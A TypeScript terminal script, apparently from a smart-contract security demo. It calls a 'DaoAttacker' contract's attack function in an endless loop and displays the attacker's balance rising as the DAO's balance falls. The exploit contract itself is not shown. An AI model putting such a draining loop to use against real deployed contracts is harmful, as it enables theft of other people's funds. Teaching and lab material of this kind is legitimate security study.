import React, { useState, useEffect } from 'react'
import { render, Text, Box } from 'ink'
import { formatEther } from 'viem'
import { Dao, DaoAttacker } from '../codegen/addresses.ts'
import { abis } from '../codegen/abis.ts'
import { wallet } from '../tools/lib/index.ts'

async function fetchBalances() {
    return Promise.all([
        wallet.getBalance({ address: DaoAttacker }),
        wallet.getBalance({ address: Dao }),
    ])
}

async function attack() {
    const { request } = await wallet.simulateContract({
        address: DaoAttacker,
        abi: abis.DaoAttacker,
        functionName: 'attack',
    })

    const hash = await wallet.writeContract(request)
    let receipt = await wallet.waitForTransactionReceipt({
        hash,
    })

    console.assert(receipt.status === 'success', 'Transaction failed')
    setTimeout(attack, 0)
}

const initialBalances = await fetchBalances()
setTimeout(attack, 0)

const App = () => {
    const [[attacker, dao], setBalances] = useState(initialBalances)

    useEffect(() => {
        const interval = setInterval(
            () => fetchBalances().then(setBalances),
            1000
        )
        return () => clearInterval(interval)
    }, [])

    return (
        <Box flexDirection="column">
            <Text>🏴‍☠️ Attacker balance: {formatEther(attacker)}</Text>
            <Text>🏛️ DAO balance: {formatEther(dao)}</Text>
        </Box>
    )
}

render(<App />)
